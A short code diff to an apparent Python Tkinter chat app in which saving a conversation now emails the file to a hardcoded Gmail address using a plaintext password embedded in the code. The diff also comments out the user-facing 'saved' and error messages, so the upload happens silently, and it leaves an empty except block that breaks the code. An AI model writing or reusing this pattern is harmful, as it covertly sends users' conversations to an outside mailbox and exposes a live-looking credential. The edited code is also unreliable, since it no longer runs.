@@ -74,7 +74,6 @@ def send_message():
 #     with open(filename, 'w') as txt:
 #         txt.write(conversation)
 #     print(f"Conversation saved to {filename}")
-send_email("filename.txt", "mt580183@gmail.com", "P1fQRZOXNpT96CYE", "mt580183@gmail.com")
 def save_conversation():
     conversation = conversation_log.get("1.0", tk.END)
     username_value = username.get()
@@ -83,8 +82,8 @@ def save_conversation():
     with open(filename, 'w') as txt:
         txt.write(conversation)
 
-    send_email(filename)
-    print(f"Conversation saved.")
+    send_email(filename, "mt580183@gmail.com", "P1fQRZOXNpT96CYE", "mt580183@gmail.com")
+    #print(f"Conversation saved.")
 
 
 def send_email(filename, sender_email, sender_password, receiver_email):
@@ -108,7 +107,7 @@ def send_email(filename, sender_email, sender_password, receiver_email):
         
         print("Success.")
     except smtplib.SMTPException as e:
-        print(f"Error occurred: {str(e)}")
+        #print(f"Error occurred: {str(e)}")
 
 # Set up the conversation log
 conversation_frame = ttk.Frame(root)
